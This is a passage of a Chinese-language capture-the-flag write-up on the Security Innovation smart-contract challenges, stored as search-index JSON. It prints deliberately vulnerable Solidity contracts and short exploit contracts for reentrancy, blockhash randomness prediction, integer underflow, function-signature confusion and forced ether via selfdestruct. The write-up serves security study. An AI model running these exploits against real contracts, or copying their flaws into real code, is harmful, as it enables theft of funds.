_player)\n    {\n        pin = now%10000;\n    }\n\n    function unlock(uint256 _pin) external ctf{\n        require(pin == _pin, \"Incorrect PIN\");\n        msg.sender.transfer(address(this).balance);\n    }\n}\n</code></pre> <p>\u53ef\u4ee5\u53d1\u73b0\uff0c\u9700\u8981\u8c03\u7528 unlock \u51fd\u6570\uff0c\u5b83\u9700\u8981\u63a5\u6536\u4e00\u4e2a\u6b63\u786e\u7684 pin\uff0c\u8fd9\u4e2a pin \u662f\u4ece\u521b\u5efa\u5408\u7ea6\u7684\u65f6\u95f4\u6233\u8ba1\u7b97\u6765\u7684\uff0c\u53ef\u4ee5\u5728\u94fe\u4e0a\u627e\u5230\u90e8\u7f72\u65f6\u95f4\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 web3 \u8bfb\u53d6\u5408\u7ea6 pin \u4f4d\u7f6e\u7684 storage \u4ece\u800c\u770b\u5230 pin \u5185\u5bb9\uff1a</p> <pre><code>&gt; await web3.eth.getStorageAt(\"0x56e06639308e17fd9d948ebaea5b2e4b4beef06e\", 1, (x,y)=&gt;{console.log(y);})\n0x0000000000000000000000000000000000000000000000000000000000000f73\n</code></pre> <p>\u7136\u540e\u540c\u6837\u5728 Remix \u4e0a\u7f16\u8bd1\u3001\u8f7d\u5165\u518d\u8c03\u7528 unlock \u51fd\u6570\u8f93\u5165\u6b63\u786e\u7684 pin \u5373\u53ef</p>"},{"location":"writeups/SecurityInnovation/#piggy-bank","title":"Piggy Bank","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\ncontract PiggyBank is CtfFramework{\n\n    using SafeMath for uint256;\n\n    uint256 public piggyBalance;\n    string public name;\n    address public owner;\n\n    constructor(address _ctfLauncher, address _player, string _name) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n        name=_name;\n        owner=msg.sender;\n        piggyBalance=piggyBalance.add(msg.value);\n    }\n\n    function() external payable ctf{\n        piggyBalance=piggyBalance.add(msg.value);\n    }\n\n\n    modifier onlyOwner(){\n        require(msg.sender == owner, \"Unauthorized: Not Owner\");\n        _;\n    }\n\n    function withdraw(uint256 amount) internal{\n        piggyBalance = piggyBalance.sub(amount);\n        msg.sender.transfer(amount);\n    }\n\n    function collectFunds(uint256 amount) public onlyOwner ctf{\n        require(amount&lt;=piggyBalance, \"Insufficient Funds in Contract\");\n        withdraw(amount);\n    }\n\n}\n\n\ncontract CharliesPiggyBank is PiggyBank{\n\n    uint256 public withdrawlCount;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        PiggyBank(_ctfLauncher, _player, \"Charlie\") \n    {\n        withdrawlCount = 0;\n    }\n\n    function collectFunds(uint256 amount) public ctf{\n        require(amount&lt;=piggyBalance, \"Insufficient Funds in Contract\");\n        withdrawlCount = withdrawlCount.add(1);\n        withdraw(amount);\n    }\n\n}\n</code></pre> <p>withdraw \u662f internal\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\uff0ccollectFunds \u662f public \u53ef\u4ee5\u8c03\u7528</p> <p>\u867d\u7136\u5728 PiggyBank \u5408\u7ea6\u4e2d\u52a0\u4e86 onlyOwner \u8fd9\u4e2a modifier\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u90e8\u7f72\u7684 CharliesPiggyBank \u5408\u7ea6\u91cd\u8f7d\u4e86\u8fd9\u4e2a\u51fd\u6570\u5e76\u6ca1\u6709\u5e26 modifier\uff0c\u56e0\u6b64\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528 collectFunds \u6765 withdraw \u9898\u76ee\u5408\u7ea6\u4e2d\u7684\u6240\u6709\u94b1</p>"},{"location":"writeups/SecurityInnovation/#si-token-sale","title":"SI Token Sale","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\n// https://github.com/OpenZeppelin/openzeppelin-solidity/blob/v1.8.0/contracts/token/ERC20/StandardToken.sol\nimport \"../StandardToken.sol\";\n\ncontract SIToken is StandardToken {\n\n    using SafeMath for uint256;\n\n    string public name = \"SIToken\";\n    string public symbol = \"SIT\";\n    uint public decimals = 18;\n    uint public INITIAL_SUPPLY = 1000 * (10 ** decimals);\n\n    constructor() public{\n        totalSupply_ = INITIAL_SUPPLY;\n        balances[this] = INITIAL_SUPPLY;\n    }\n}\n\ncontract SITokenSale is SIToken, CtfFramework {\n\n    uint256 public feeAmount;\n    uint256 public etherCollection;\n    address public developer;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n        feeAmount = 10 szabo; \n        developer = msg.sender;\n        purchaseTokens(msg.value);\n    }\n\n    function purchaseTokens(uint256 _value) internal{\n        require(_value &gt; 0, \"Cannot Purchase Zero Tokens\");\n        require(_value &lt; balances[this], \"Not Enough Tokens Available\");\n        balances[msg.sender] += _value - feeAmount;\n        balances[this] -= _value;\n        balances[developer] += feeAmount; \n        etherCollection += msg.value;\n    }\n\n    function () payable external ctf{\n        purchaseTokens(msg.value);\n    }\n\n    // Allow users to refund their tokens for half price ;-)\n    function refundTokens(uint256 _value) external ctf{\n        require(_value&gt;0, \"Cannot Refund Zero Tokens\");\n        transfer(this, _value);\n        etherCollection -= _value/2;\n        msg.sender.transfer(_value/2);\n    }\n\n    function withdrawEther() external ctf{\n        require(msg.sender == developer, \"Unauthorized: Not Developer\");\n        require(balances[this] == 0, \"Only Allowed Once Sale is Complete\");\n        msg.sender.transfer(etherCollection);\n    }\n\n}\n</code></pre> <p>\u53ef\u4ee5\u901a\u8fc7 refundTokens \u6765\u8f6c\u51fa\u4f59\u989d\uff0c\u4f46\u662f\u6700\u591a\u53ea\u80fd\u8f6c\u51fa balances \u7684\u4e00\u534a\uff0c\u6240\u4ee5\u8981\u5148\u63d0\u9ad8\u81ea\u5df1\u7684\u4ee3\u5e01\u4f59\u989d\u3002\u4e0d\u96be\u53d1\u73b0 purchaseTokens \u51fd\u6570\u4e2d\u5b58\u5728\u4e0b\u6ea2\uff1a <pre><code>balances[msg.sender] += _value - feeAmount;\n</code></pre> \u53ea\u8981\u4f20\u5165\u7684 _value \u5c0f\u4e8e feeAmount \u5c31\u53ef\u4ee5\u4f7f balances \u4e0b\u6ea2\u3002\u867d\u7136 purchaseTokens \u51fd\u6570\u662f internal \u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\uff0c\u4f46\u662f fallback \u51fd\u6570\u4e2d\u76f4\u63a5\u5c06 msg.value \u4f5c\u4e3a _value \u8c03\u7528\u4e86 purchaseTokens \u51fd\u6570\u3002\u56e0\u6b64\u53ef\u4ee5\u5148\u76f4\u63a5\u5411\u5408\u7ea6\u8d26\u6237\u8f6c 1Wei\uff0c\u5373\u53ef\u901a\u8fc7 fallback \u89e6\u53d1\u4e0b\u6ea2</p> <p>\u4e4b\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7 refundTokens \u6765\u8f6c\u51fa\u4e86\u3002\u53ef\u4ee5\u5148\u8c03\u7528 etherCollection \u770b\u4e00\u4e0b\u9700\u8981\u8f6c\u51fa\u7684\u91d1\u989d\uff08\u4e5f\u53ef\u4ee5\u901a\u8fc7\u521d\u59cb + 1Wei \u7684\u65b9\u5f0f\u8ba1\u7b97\uff09\uff0c\u518d\u4e58\u4ee5\u4e8c\u5c31\u662f\u8981\u4f20\u7ed9 refundTokens \u7684\u53c2\u6570\u4e86</p>"},{"location":"writeups/SecurityInnovation/#secure-bank","title":"Secure Bank","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\ncontract SimpleBank is CtfFramework{\n\n    mapping(address =&gt; uint256) public balances;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n        balances[msg.sender] = msg.value;\n    }\n\n    function deposit(address _user) public payable ctf{\n        balances[_user] += msg.value;\n    }\n\n    function withdraw(address _user, uint256 _value) public ctf{\n        require(_value&lt;=balances[_user], \"Insufficient Balance\");\n        balances[_user] -= _value;\n        msg.sender.transfer(_value);\n    }\n\n    function () public payable ctf{\n        deposit(msg.sender);\n    }\n\n}\n\ncontract MembersBank is SimpleBank{\n\n    mapping(address =&gt; string) public members;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        SimpleBank(_ctfLauncher, _player)\n    {\n    }\n\n    function register(address _user, string _username) public ctf{\n        members[_user] = _username;\n    }\n\n    modifier isMember(address _user){\n        bytes memory username = bytes(members[_user]);\n        require(username.length != 0, \"Member Must First Register\");\n        _;\n    }\n\n    function deposit(address _user) public payable isMember(_user) ctf{\n        super.deposit(_user);\n    }\n\n    function withdraw(address _user, uint256 _value) public isMember(_user) ctf{\n        super.withdraw(_user, _value);\n    }\n\n}\n\ncontract SecureBank is MembersBank{\n\n    constructor(address _ctfLauncher, address _player) public payable\n        MembersBank(_ctfLauncher, _player)\n    {\n    }\n\n    function deposit(address _user) public payable ctf{\n        require(msg.sender == _user, \"Unauthorized User\");\n        require(msg.value &lt; 100 ether, \"Exceeding Account Limits\");\n        require(msg.value &gt;= 1 ether, \"Does Not Satisfy Minimum Requirement\");\n        super.deposit(_user);\n    }\n\n    function withdraw(address _user, uint8 _value) public ctf{\n        require(msg.sender == _user, \"Unauthorized User\");\n        require(_value &lt; 100, \"Exceeding Account Limits\");\n        require(_value &gt;= 1, \"Does Not Satisfy Minimum Requirement\");\n        super.withdraw(_user, _value * 1 ether);\n    }\n\n    function register(address _user, string _username) public ctf{\n        require(bytes(_username).length!=0, \"Username Not Enough Characters\");\n        require(bytes(_username).length&lt;=20, \"Username Too Many Characters\");\n        super.register(_user, _username);\n    }\n}\n</code></pre> <p>\u5408\u7ea6\u6709\u70b9\u957f\uff0c\u6709\u4e09\u4e2a\u5408\u7ea6 SimpleBank\u3001MembersBank \u548c SecureBank\uff0c\u662f\u9010\u4e2a\u7ee7\u627f\u7684\u5173\u7cfb</p> <p>\u901a\u8fc7 SimpleBank \u7684 constructor \u53ef\u4ee5\u770b\u51fa\uff0c\u6240\u6709\u94b1\u90fd\u8f6c\u7ed9\u4e86\u9898\u76ee\u5408\u7ea6\u7684\u521b\u5efa\u8005\uff0c\u800c\u8fd9\u4e2a\u53ef\u4ee5\u901a\u8fc7 etherscan \u67e5\u5230\uff0c\u6240\u4ee5\u76ee\u6807\u5c31\u662f\u8c03\u7528 withdraw \u51fd\u6570\u6765\u501f\u52a9\u521b\u5efa\u8005\u7684\u5730\u5740\u8f6c\u51fa\u5408\u7ea6\u4e2d\u7684\u94b1</p> <p>\u800c withdraw \u5b58\u5728\u4e86\u4e00\u4e9b\u95ee\u9898\uff1a</p> <ul> <li>SecureBank \u4e2d\u7684 withdraw \u68c0\u67e5\u4e86\u4f20\u5165\u7684 _user \u662f\u5426\u662f msg.sender\uff0c\u4e0d\u80fd\u4ece\u4e2d\u9020\u5047</li> <li>SecureBank \u7684 withdraw \u7684 _value \u53c2\u6570\u662f uint8 \u7c7b\u578b\uff0c\u800c MembersBank \u4e2d withdraw \u7684\u53c2\u6570\u662f uint256 \u7c7b\u578b\uff0c\u8fd9\u5bfc\u81f4\u4e86\u8fd9\u4e24\u4e2a\u51fd\u6570\u5e76\u4e0d\u662f\u91cd\u8f7d\u5173\u7cfb\uff0c\u800c\u662f\u4e24\u4e2a\u51fd\u6570</li> </ul> <p>\u6240\u4ee5\u73b0\u5728\u7684\u76ee\u6807\u662f\u8c03\u7528 MembersBank \u7684 withdraw \u51fd\u6570\u3002\u53ef\u4ee5\u53d1\u73b0\u5b83\u5e26\u6709\u4e00\u4e2a isMember(_user) \u7684 modifier\uff0c\u6240\u4ee5\u5148\u8981\u7ed9\u521b\u5efa\u8005\u7684\u5730\u5740 register \u4e00\u4e0b\uff0c\u7136\u540e\u518d\u8c03\u7528 withdraw(address, uint256) \u8f6c\u51fa\u6240\u6709\u4f59\u989d\u5373\u53ef</p>"},{"location":"writeups/SecurityInnovation/#lottery","title":"Lottery","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\ncontract Lottery is CtfFramework{\n\n    using SafeMath for uint256;\n\n    uint256 public totalPot;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n        totalPot = totalPot.add(msg.value);\n    }\n\n    function() external payable ctf{\n        totalPot = totalPot.add(msg.value);\n    }\n\n    function play(uint256 _seed) external payable ctf{\n        require(msg.value &gt;= 1 finney, \"Insufficient Transaction Value\");\n        totalPot = totalPot.add(msg.value);\n        bytes32 entropy = blockhash(block.number);\n        bytes32 entropy2 = keccak256(abi.encodePacked(msg.sender));\n        bytes32 target = keccak256(abi.encodePacked(entropy^entropy2));\n        bytes32 guess = keccak256(abi.encodePacked(_seed));\n        if(guess==target){\n            //winner\n            uint256 payout = totalPot;\n            totalPot = 0;\n            msg.sender.transfer(payout);\n        }\n    }    \n}\n</code></pre> <p>\u9884\u6d4b\u4f2a\u968f\u673a\u6570\uff0c\u53ea\u9700\u8981\u7f16\u5199\u4e00\u4e2a\u65b0\u7684\u5408\u7ea6\u7136\u540e\u6839\u636e play \u91cc\u7684\u903b\u8f91\u751f\u6210 target\uff0c\u7136\u540e\u4f20\u7ed9 play \u5373\u53ef</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\u8981\u652f\u4ed8 1 finney \u4f5c\u4e3a value\uff0c\u5e76\u4e14\u5728\u90e8\u7f72\u5408\u7ea6\u4e4b\u540e\u8981\u5148\u8c03\u7528\u4e00\u4e0b Lottery \u7684 ctf_challenge_add_authorized_sender \u51fd\u6570\uff08\u6765\u81ea CtfFramework\uff09\u5c06\u5408\u7ea6\u5730\u5740\u52a0\u5165\u767d\u540d\u5355</p> exp <pre><code>contract Exploit {\n    Lottery challenge;\n    constructor(address addr) public {\n        challenge = Lottery(addr);\n    }\n    function exp() public payable {\n        bytes32 entropy = blockhash(block.number);\n        bytes32 entropy2 = keccak256(abi.encodePacked(this));\n        uint256 ans = uint256(entropy ^ entropy2);\n        challenge.play.value(msg.value)(ans);\n    }\n    function() public payable {}\n    function destroy(address addr) public {\n        selfdestruct(addr);\n    }\n}\n</code></pre>"},{"location":"writeups/SecurityInnovation/#heads-or-tails","title":"Heads or Tails","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\ncontract HeadsOrTails is CtfFramework{\n\n    using SafeMath for uint256;\n\n    uint256 public gameFunds;\n    uint256 public cost;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n        gameFunds = gameFunds.add(msg.value);\n        cost = gameFunds.div(10);\n    }\n\n    function play(bool _heads) external payable ctf{\n        require(msg.value == cost, \"Incorrect Transaction Value\");\n        require(gameFunds &gt;= cost.div(2), \"Insufficient Funds in Game Contract\");\n        bytes32 entropy = blockhash(block.number-1);\n        bytes1 coinFlip = entropy[0] &amp; 1;\n        if ((coinFlip == 1 &amp;&amp; _heads) || (coinFlip == 0 &amp;&amp; !_heads)) {\n            //win\n            gameFunds = gameFunds.sub(msg.value.div(2));\n            msg.sender.transfer(msg.value.mul(3).div(2));\n        }\n        else {\n            //loser\n            gameFunds = gameFunds.add(msg.value);\n        }\n    }\n\n}\n</code></pre> <p>\u540c\u6837\u662f\u8ba1\u7b97\u4f2a\u968f\u673a\u6570\uff0c\u6bcf\u6b21 play \u9700\u8981 0.1 ether\uff0c\u5e76\u4e14\u4ece\u9898\u76ee\u5408\u7ea6\u8d26\u6237\u4e2d\u8f6c\u51fa 0.05 ether \u4f5c\u4e3a\u5956\u52b1\u3002\u56e0\u6b64\u9700\u8981\u8c03\u7528 20 \u6b21 play \u6765\u8f6c\u51fa\u8d26\u6237\u4e2d\u7684 2 ether</p> <p>\u540c\u6837\u9700\u8981\u5728\u90e8\u7f72\u5408\u7ea6\u540e\u8c03\u7528\u9898\u76ee\u5408\u7ea6\u7684 ctf_challenge_add_authorized_sender \u51fd\u6570\u6765\u5c06\u653b\u51fb\u5408\u7ea6\u5730\u5740\u52a0\u5165\u767d\u540d\u5355\u3002\u5e76\u4e14\u505a\u5b8c\u4e4b\u540e selfdestruct \u6765\u8f6c\u56de\u653b\u51fb\u5408\u7ea6\u4e2d\u7684 3 ether \u4f1a\u6bd4\u8f83\u597d</p> exp <pre><code>contract Exploit {\n    HeadsOrTails challenge;\n    constructor(address addr) public {\n        challenge = HeadsOrTails(addr);\n    }\n    function exp() public payable {\n        bytes32 entropy = blockhash(block.number - 1);\n        bytes1 coinFlip = entropy[0] &amp; 1;\n        for (int i = 0; i &lt; 20; i++) {\n            if (coinFlip == 1) {\n                challenge.play.value(0.1 ether)(true);\n            } else {\n                challenge.play.value(0.1 ether)(false);\n            }\n        }\n    }\n    function() public payable {}\n    function destroy(address addr) public {\n        selfdestruct(addr);\n    }\n}\n</code></pre>"},{"location":"writeups/SecurityInnovation/#trust-fund","title":"Trust Fund","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\ncontract TrustFund is CtfFramework{\n\n    using SafeMath for uint256;\n\n    uint256 public allowancePerYear;\n    uint256 public startDate;\n    uint256 public numberOfWithdrawls;\n    bool public withdrewThisYear;\n    address public custodian;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n        custodian = msg.sender;\n        allowancePerYear = msg.value.div(10);        \n        startDate = now;\n    }\n\n    function checkIfYearHasPassed() internal{\n        if (now&gt;=startDate + numberOfWithdrawls * 365 days){\n            withdrewThisYear = false;\n        } \n    }\n\n    function withdraw() external ctf{\n        require(allowancePerYear &gt; 0, \"No Allowances Allowed\");\n        checkIfYearHasPassed();\n        require(!withdrewThisYear, \"Already Withdrew This Year\");\n        if (msg.sender.call.value(allowancePerYear)()){\n            withdrewThisYear = true;\n            numberOfWithdrawls = numberOfWithdrawls.add(1);\n        }\n    }\n\n    function returnFunds() external payable ctf{\n        require(msg.value == allowancePerYear, \"Incorrect Transaction Value\");\n        require(withdrewThisYear==true, \"Cannot Return Funds Before Withdraw\");\n        withdrewThisYear = false;\n        numberOfWithdrawls=numberOfWithdrawls.sub(1);\n    }\n}\n</code></pre> <p>\u91cd\u5165\u653b\u51fb\uff0c\u5199\u4e00\u4e2a\u653b\u51fb\u5408\u7ea6\uff0c\u5728\u5176 fallback \u4e2d\u518d\u6b21\u8c03\u7528 withdraw \u51fd\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u91cd\u5165\uff0c\u6ce8\u610f\u8981\u5728 MetaMask \u53d1\u9001\u4ea4\u6613\u65f6\u63d0\u9ad8\u4e00\u4e0b gas\uff0c\u4e0d\u7136\u5185\u90e8\u7684\u4ea4\u6613\u4f1a\u51fa\u73b0 gas \u4e0d\u8db3\u7684\u95ee\u9898</p> exp <pre><code>contract Exploit {\n    TrustFund challenge;\n    constructor(address addr) public {\n        challenge = TrustFund(addr);\n    }\n    function exp() public {\n        challenge.withdraw();\n    }\n    function() public payable {\n        challenge.withdraw();\n    }\n    function destroy(address addr) public {\n        selfdestruct(addr);\n    }\n}\n</code></pre>"},{"location":"writeups/SecurityInnovation/#record-label","title":"Record Label","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\n\ncontract Royalties{\n\n    using SafeMath for uint256;\n\n    address private collectionsContract;\n    address private artist;\n\n    address[] private receiver;\n    mapping(address =&gt; uint256) private receiverToPercentOfProfit;\n    uint256 private percentRemaining;\n\n    uint256 public amountPaid;\n\n    constructor(address _manager, address _artist) public\n    {\n        collectionsContract = msg.sender;\n        artist=_artist;\n\n        receiver.push(_manager);\n        receiverToPercentOfProfit[_manager] = 80;\n        percentRemaining = 100 - receiverToPercentOfProfit[_manager];\n    }\n\n    modifier isCollectionsContract() { \n        require(msg.sender == collectionsContract, \"Unauthorized: Not Collections Contract\");\n        _;\n    }\n\n    modifier isArtist(){\n        require(msg.sender == artist, \"Unauthorized: Not Artist\");\n        _;\n    }\n\n    function addRoyaltyReceiver(address _receiver, uint256 _percent) external isArtist{\n        require(_percent&lt;percentRemaining, \"Precent Requested Must Be Less Than Percent Remaining\");\n        receiver.push(_receiver);\n        receiverToPercentOfProfit[_receiver] = _percent;\n        percentRemaining = percentRemaining.sub(_percent);\n    }\n\n    function payoutRoyalties() public payable isCollectionsContract{\n        for (uint256 i = 0; i&lt; receiver.length; i++){\n            address current = receiver[i];\n            uint256 payout = msg.value.mul(receiverToPercentOfProfit[current]).div(100);\n            amountPaid = amountPaid.add(payout);\n            current.transfer(payout);\n        }\n        msg.sender.call.value(msg.value-amountPaid)(bytes4(keccak256(\"collectRemainingFunds()\")));\n    }\n\n    function getLastPayoutAmountAndReset() external isCollectionsContract returns(uint256){\n        uint256 ret = amountPaid;\n        amountPaid = 0;\n        return ret;\n    }\n\n    function () public payable isCollectionsContract{\n        payoutRoyalties();\n    }\n}\n\ncontract Manager{\n    address public owner;\n\n    constructor(address _owner) public {\n        owner = _owner;\n    }\n\n    function withdraw(uint256 _balance) public {\n        owner.transfer(_balance);\n    }\n\n    function () public payable{\n        // empty\n    }\n}\n\ncontract RecordLabel is CtfFramework{\n\n    using SafeMath for uint256;\n\n    uint256 public funds;\n    address public royalties;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n        royalties = new Royalties(new Manager(_ctfLauncher), _player);\n        funds = funds.add(msg.value);\n    }\n\n    function() external payable ctf{\n        funds = funds.add(msg.value);\n    }\n\n\n    function withdrawFundsAndPayRoyalties(uint256 _withdrawAmount) external ctf{\n        require(_withdrawAmount&lt;=funds, \"Insufficient Funds in Contract\");\n        funds = funds.sub(_withdrawAmount);\n        royalties.call.value(_withdrawAmount)();\n        uint256 royaltiesPaid = Royalties(royalties).getLastPayoutAmountAndReset();\n        uint256 artistPayout = _withdrawAmount.sub(royaltiesPaid); \n        msg.sender.transfer(artistPayout);\n    }\n\n    function collectRemainingFunds() external payable{\n        require(msg.sender == royalties, \"Unauthorized: Not Royalties Contract\");\n    }\n\n}\n</code></pre> <p>\u5408\u7ea6\u770b\u8d77\u6765\u5f88\u957f\uff0c\u4f46\u662f\u5927\u81f4\u770b\u4e00\u4e0b\u7684\u8bdd\u5c31\u53ef\u4ee5\u770b\u51fa\u8c03\u7528 withdrawFundsAndPayRoyalties \u51fd\u6570\u7684\u65f6\u5019\u4f1a\u628a\u5168\u90e8\u7684 _withdrawAmount \u5168\u90e8\u4f20\u7ed9 Royalties\uff0c\u5176\u4e2d\u4f1a\u5c06 80% \u4f20\u7ed9\u6211\u4eec\uff0c\u518d\u628a 20% \u4f20\u56de\u53bb\uff0c\u800c\u8fd9 20% \u53c8\u4f1a\u5728 withdrawFundsAndPayRoyalties \u4e2d\u518d\u4f20\u7ed9\u6211\u4eec\u3002\u6240\u4ee5\u53ea\u9700\u8981\u76f4\u63a5\u8c03\u7528 withdrawFundsAndPayRoyalties \u51fd\u6570\u5c06 1 ether \u63d0\u53d6\u51fa\u6765\u5c31\u53ef\u4ee5\u4e86</p>"},{"location":"writeups/SecurityInnovation/#slot-machine","title":"Slot Machine","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\nimport \"../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol\";\n\ncontract SlotMachine is CtfFramework{\n\n    using SafeMath for uint256;\n\n    uint256 public winner;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n        winner = 5 ether;\n    }\n\n    function() external payable ctf{\n        require(msg.value == 1 szabo, \"Incorrect Transaction Value\");\n        if (address(this).balance &gt;= winner){\n            msg.sender.transfer(address(this).balance);\n        }\n    }\n\n}\n</code></pre> <p>\u76ee\u6807\u662f\u8ba9\u9898\u76ee\u5408\u7ea6\u8d26\u6237\u4e2d\u7684\u4f59\u989d\u4e0d\u5c11\u4e8e 5 ether\uff0c\u800c\u4e14\u5408\u7ea6\u4e2d\u7684 fallback \u51fd\u6570\u53ea\u63a5\u6536 1 szabo</p> <p>\u4f46\u662f\u5982\u679c\u901a\u8fc7\u53e6\u4e00\u4e2a\u5408\u7ea6\u7684 selfdestruct \u6765\u5c06\u5269\u4f59\u4f59\u989d\u5168\u90e8\u8f6c\u79fb\u5230\u9898\u76ee\u5408\u7ea6\u4e0a\u7684\u8bdd\u662f\u4e0d\u4f1a\u7ecf\u8fc7 fallback \u51fd\u6570\u7684\uff0c\u6240\u4ee5\u521b\u5efa\u53e6\u4e00\u4e2a\u5408\u7ea6\uff0c\u8f6c\u5165\u4e0d\u5c11\u4e8e 3.5 ether \u7136\u540e\u518d selfdestruct \u5c31\u53ef\u4ee5\u4e86 </p> exp <pre><code>contract Exploit {\n    address challenge;\n    constructor(address addr) public payable {\n        challenge = addr;\n    }\n    function exp() public {\n        selfdestruct(challenge);\n    }\n}\n</code></pre>"},{"location":"writeups/SecurityInnovation/#rainy-day-fund","title":"Rainy Day Fund","text":"\u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity 0.4.24;\n\nimport \"../CtfFramework.sol\";\n\ncontract DebugAuthorizer{\n\n    bool public debugMode;\n\n    constructor() public payable{\n        if(address(this).balance == 1.337 ether){\n            debugMode=true;\n        }\n    }\n}\n\ncontract RainyDayFund is CtfFramework{\n\n    address public developer;\n    mapping(address=&gt;bool) public fundManagerEnabled;\n    DebugAuthorizer public debugAuthorizer;\n\n    constructor(address _ctfLauncher, address _player) public payable\n        CtfFramework(_ctfLauncher, _player)\n    {\n        //debugAuthorizer = (new DebugAuthorizer).value(1.337 ether)(); // Debug mode only used during development\n        debugAuthorizer = new DebugAuthorizer();\n        developer = msg.sender;\n        fundManagerEnabled[msg.sender] = true;\n    }\n\n    modifier isManager() {\n        require(fundManagerEnabled[msg.sender] || debugAuthorizer.debugMode() || msg.sender == developer, \"Unauthorized: Not a Fund Manager\");\n        _;\n    }\n\n    function () external payable ctf{\n        // Anyone can add to the fund    \n    }\n\n    function addFundManager(address _newManager) external isManager ctf{\n        fundManagerEnabled[_newManager] = true;\n    }\n\n    function removeFundManager(address _previousManager) external isManager ctf{\n        fundManagerEnabled[_previousManager] = false;\n    }\n\n    function withdraw() external isManager ctf{\n        msg.sender.transfer(address(this).balance);\n    }\n}\n</code></pre> <p>\u8f6c\u51fa\u6240\u6709\u94b1\u7684\u8bdd\u8981\u8c03\u7528 withdraw \u51fd\u6570\uff0c\u5b83\u5e26\u6709 isManager \u8fd9\u4e2a modifier\uff0c\u800c manager \u6211\u4eec\u6539\u4e0d\u4e86\uff0c\u6240\u4ee5\u601d\u8def\u5728\u4e8e\u5f00\u542f debug mode</p> <p>\u4f46\u662f\u9898\u76ee\u7684 constructor \u4e2d\u4f1a\u521b\u5efa DebugAuthorizer \u5408\u7ea6\u5b9e\u4f8b\u800c\u4e14\u5e76\u4e0d\u5411\u5176\u4e2d\u8f6c\u5165 1.337 ether\uff0c\u4e5f\u5c31\u4e0d\u4f1a\u6253\u5f00 debug mode\uff0c\u540e\u7eed\u518d\u5411\u5176\u4e2d\u8f6c\u8d26\u7684\u8bdd\u4e5f\u4e0d\u4f1a\u6253\u5f00 debug mode\uff08\u56e0\u4e3a\u8fd9\u4e2a\u662f\u5728 constructor \u4e2d\u8d4b\u503c\u7684\uff09</p> <p>\u6240\u4ee5\u5c31\u9700\u8981\u63d0\u524d\u8ba1\u7b97\u51fa\u4e0b\u4e00\u6b21 developer \u90e8\u7f72\u7684\u9898\u76ee\u5408\u7ea6\u7684\u5730\u5740\uff0c\u518d\u63d0\u524d\u8ba1\u7b97\u51fa\u5176\u521b\u5efa\u7684 DebugAuthorizer \u7684\u5730\u5740\uff0c\u5148\u5411\u5176\u4e2d\u8f6c\u5165 1.337 ether\uff0c\u8fd9\u65f6\u91cd\u542f\u9898\u76ee\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u9898\u76ee\u5408\u7ea6\uff0c\u5176\u4e2d\u521b\u5efa DebugAuthorizer \u65f6\u68c0\u67e5 balance \u53d1\u73b0\u5df2\u7ecf\u6709\u4e86 1.337 ether\uff0c\u4e5f\u5c31\u6253\u5f00\u4e86 debug mode \u53ef\u4ee5\u76f4\u63a5 withdraw</p> <p>\u800c\u63d0\u524d\u8ba1\u7b97\u5408\u7ea6\u5730\u5740\u7684\u65b9\u6cd5\u5c31\u662f\u8fd0\u7528 create \u7684\u539f\u7406\uff0c\u5373\u5916\u90e8\u8d26\u6237\u521b\u5efa\u5408\u7ea6\u6216\u8005\u5728\u5408\u7ea6\u4e2d\u901a\u8fc7 CREATE \u64cd\u4f5c\u7801\u521b\u5efa\u65b0\u5408\u7ea6\u7684\u65f6\u5019\u8ba1\u7b97\u5730\u5740\u7684\u7b97\u6cd5\u662f\uff1a <pre><code>keccak(rlp.encode([deployer, nonce]))\n</code></pre> \u5e76\u4e14\u5728\u5408\u7ea6\u5185\u90e8\u901a\u8fc7 CREATE \u521b\u5efa\u65b0\u5408\u7ea6\u7684\u8bdd\uff0cnonce 